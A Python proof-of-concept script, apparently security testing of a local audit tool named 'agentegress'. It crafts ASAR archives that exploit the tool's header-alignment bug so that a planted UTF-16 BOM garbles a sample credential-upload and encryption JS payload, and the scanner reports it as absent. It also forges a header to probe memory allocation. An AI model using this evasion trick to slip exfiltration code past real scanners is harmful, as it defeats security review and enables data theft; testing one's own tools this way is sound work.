# -*- coding: utf-8 -*-
"""C1/C2 组合：把 base 偏移 bug 变成确定的漏报。

已知：AsarArchive.base = 16 + json_size，而真实 base = 16 + align4(json_size)。
      json_size % 4 != 0 时，工具读每个文件都【整体前移 1~3 字节】，
      于是 blob 的头 2 字节来自【上一个文件的尾部】。

攻击：让上一个文件以 b'\xff\xfe' 结尾。
      decode_bytes 见到 \xff\xfe 就按 UTF-16LE 解码 →
      后面真正的 JS 内容全部变成乱码 → 预筛零命中 → 能力判为 absent。
"""
import json
import os
import shutil
import struct
import subprocess
import sys

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[2]))
import agentegress as ae  # noqa: E402

ROOT = r"tmp_attack\shift"
shutil.rmtree(ROOT, ignore_errors=True)
os.makedirs(ROOT, exist_ok=True)

JUICE = (b"const c=require('crypto');\n"
         b"const enc=c.createCipheriv('aes-256-gcm',k,iv);\n"
         b"fetch('/upload/credential');\n"
         b"const cred=await fetch('/api/v1/snapshot/upload',{method:'POST'});\n"
         b"const r=await fetch(cred.uploadUrl,{method:'PUT'});\n"
         b"const w=c.publicEncrypt({padding:c.constants.RSA_PKCS1_OAEP_PADDING},k);\n"
         b"await fetch('https://zcode.oss-cn-hangzhou.aliyuncs.com',{method:'POST'});\n"
         b"repo_snapshot; keyversion; uploadAddress;\n")

POISON = b"XXXXXXXX\xff\xfe"          # 尾部两字节 = UTF-16LE BOM


def craft(path, want_shift=True):
    """A 文件尾部放 BOM；B 文件是真正的载荷。json_size 调到 %4==2。"""
    for attempt in range(40):
        a = {"size": len(POISON), "offset": "0"}
        b = {"size": len(JUICE), "offset": str(len(POISON))}
        tree = {"files": {"aaaa" + "z" * attempt + ".bin": a, "bbbb_payload.js": b}}
        js = json.dumps(tree, separators=(",", ":")).encode("utf-8")
        if want_shift:
            if len(js) % 4 == 2:
                break
        else:
            if len(js) % 4 == 0:
                break
    else:
        raise SystemExit("调不出目标对齐")
    pad = (-len(js)) % 4
    hdr = (struct.pack("<I", 4) + struct.pack("<I", 8 + len(js) + pad)
           + struct.pack("<I", 4 + len(js) + pad) + struct.pack("<I", len(js)))
    with open(path, "wb") as f:
        f.write(hdr + js + b"\x00" * pad + POISON + JUICE)
    true_base = 16 + len(js) + pad
    return len(js), true_base


print("=" * 78)
for label, want in (("对齐（json_size%4==0）", False), ("错位（json_size%4==2）", True)):
    p = os.path.join(ROOT, "shift_%s.asar" % ("no" if not want else "yes"))
    js_len, true_base = craft(p, want_shift=want)
    ar = ae.AsarArchive(p)
    with open(p, "rb") as f:
        _a, _b, _c, d = struct.unpack("<IIII", f.read(16))
    print()
    print("--- %s" % label)
    print("    json_size=%d  %%4=%d  工具 base=%d  真实 base=%d  偏移=%+d"
          % (d, d % 4, ar.base, true_base, ar.base - true_base))
    # 直接看 bbbb_payload.js 被读到什么
    for rel, item in ar.iter_files():
        if rel.endswith("bbbb_payload.js"):
            toolblob = ar.read(rel, item)
            with open(p, "rb") as f:
                f.seek(true_base + int(item["offset"]))
                trueblob = f.read(int(item["size"]))
            print("    工具读到的头 12 字节: %r" % toolblob[:12])
            print("    真实内容的头 12 字节: %r" % trueblob[:12])
            tt = ae.decode_bytes(toolblob)
            tb = ae.decode_bytes(trueblob)
            print("    工具解码后是否含 createCipheriv: %s" % ("createCipheriv" in tt))
            print("    真实解码后是否含 createCipheriv: %s" % ("createCipheriv" in tb))
            print("    工具解码后前 60 字符: %r" % tt[:60])
    # 走完整审计
    acc = ae.CapabilityAccumulator()
    _h, meta = ae.audit_path(p, acc=acc)
    lv = {c["id"]: c["level"] for c in ae.aggregate_from_buckets(acc)}
    print("    audit_path: candidates=%s scanned=%s hits=%s"
          % (meta["candidates"], meta["files_scanned"], acc.total_hits))
    print("    能力等级: %s" % {k: v for k, v in lv.items() if v != "absent"})

print()
print("=" * 78)
print("CLI 级结果")
print("=" * 78)
MAIN = os.path.join(str(__import__("pathlib").Path(__file__).resolve().parents[2]), "agentegress.py")
for nm in ("shift_no.asar", "shift_yes.asar"):
    out = os.path.join(ROOT, nm + ".json")
    subprocess.run([sys.executable, MAIN, "--static-path", os.path.join(ROOT, nm),
                    "--quiet", "-j", out], cwd=str(__import__("pathlib").Path(__file__).resolve().parents[2]),
                   capture_output=True, text=True)
    d = json.load(open(out, encoding="utf-8"))
    for r in d["results"]:
        if r["id"] != "static-custom":
            continue
        s = r["static"]["summary"]
        print("  %-16s level=%-7s summary=%r" % (nm, r["level"], s["text"]))
        for c in r["static"]["capabilities"]:
            if c["level"] != "absent":
                print("        %s %s score=%s hits=%s"
                      % (c["level"], c["id"], c["score"], c["hit_total"]))

print()
print("=" * 78)
print("MAX_HEADER 的分配行为实测（128 字节文件 + json_size=256MB）")
print("=" * 78)
big = os.path.join(ROOT, "alloc.asar")
MH = ae.AsarArchive.MAX_HEADER
with open(big, "wb") as f:
    f.write(struct.pack("<I", 4) + struct.pack("<I", 0) + struct.pack("<I", 0)
            + struct.pack("<I", MH))
    f.write(b"[" + b"0" * 127)
print("  文件大小 = %d 字节, 声明的 json_size = %d" % (os.path.getsize(big), MH))
import resource  # noqa: E402

try:
    before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
except Exception:
    before = 0
try:
    ae.AsarArchive(big)
except Exception as e:
    print("  结果: %s: %s" % (type(e).__name__, str(e)[:60]))
after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
print("  进程峰值 RSS: %d KB -> %d KB  (增量 %d KB)" % (before, after, after - before))
